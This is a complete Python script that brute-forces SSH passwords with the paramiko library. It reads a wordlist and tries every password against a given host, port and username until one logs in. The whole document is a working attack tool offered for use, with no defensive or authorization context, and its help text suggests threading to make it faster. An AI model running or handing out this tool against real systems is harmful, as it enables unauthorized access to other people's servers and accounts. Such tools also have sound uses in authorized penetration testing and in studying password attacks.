#!/usr/bin/env python3

import paramiko
import argparse


def get_wordlist(filename):
    """
	read filename and return list of passwords
	"""
    wordlist = list()
    with open(filename, "r") as file:
        data = file.read()
        wordlist = [word for word in data.split("\n")]

    return wordlist


def bruteforce(target, port_number, user, wordlist):
    """
	try every password on worldlist( array ) against the target on port 
	"""

    # create ssh object
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    # add unknown hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # brute force
    for password in wordlist:
        try:
            print("try : {}".format(password))

            client.connect(target, port=port_number, username=user, password=password)
            print("Found 1 valid password : {} ".format(password))
            client.close()
            exit()

        except paramiko.ssh_exception.AuthenticationException:
            pass
        except KeyboardInterrupt:
            client.close()
            exit()
        except:
            pass
    client.close()


def main(target, port, username, wordlist):

    # split words list in three parts
    wordlist = get_wordlist(wordlist)

    # brute force
    bruteforce(target, port, username, wordlist)

    print("End Of BruteForce")
    print("0 Password is Valid")


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        "ssh bruteforcer in python ( This script is very slow, use threading to save time )"
    )
    parser.add_argument("target", nargs=1, metavar="hostname", type=str)
    parser.add_argument("port", nargs=1, type=int)
    parser.add_argument("username", nargs=1, type=str)
    parser.add_argument(
        "wordlist", nargs=1, type=str, help="line sperated passwords in wordlist.txt"
    )

    args = parser.parse_args()

    target = args.target[0]
    port = args.port[0]
    username = args.username[0]
    wordlist = args.wordlist[0]

    main(target, port, username, wordlist)
